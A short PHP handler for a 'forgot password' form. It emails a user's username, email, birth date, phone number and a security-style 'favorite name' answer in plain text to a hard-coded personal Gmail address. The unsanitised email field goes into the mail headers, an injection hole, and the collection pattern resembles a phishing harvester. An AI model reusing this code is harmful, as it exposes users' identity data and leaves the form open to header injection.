<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $username = $_POST["username"];
    $user_email = $_POST["user_email"];
    $date = $_POST["date"];
    $phone = $_POST["phone"];
    $name = $_POST["name"];

    // Compose the email content
    $to = "omarfaruk122019@gmail.com"; // Your Gmail address
    $subject = "Forget Password Request";
    $message = "Username: " . $username . "\r\n";
    $message .= "Email: " . $user_email . "\r\n";
    $message .= "Date of Birth: " . $date . "\r\n";
    $message .= "Phone Number: " . $phone . "\r\n";
    $message .= "Favorite Name: " . $name . "\r\n";

    // Set the headers
    $headers = "From: " . $user_email . "\r\n";
    $headers .= "Reply-To: " . $user_email . "\r\n";

    // Send the email
    mail($to, $subject, $message, $headers);

    // Redirect back to the page or show a success message
    header("Location: your_success_page.html");
    exit;
}
?>
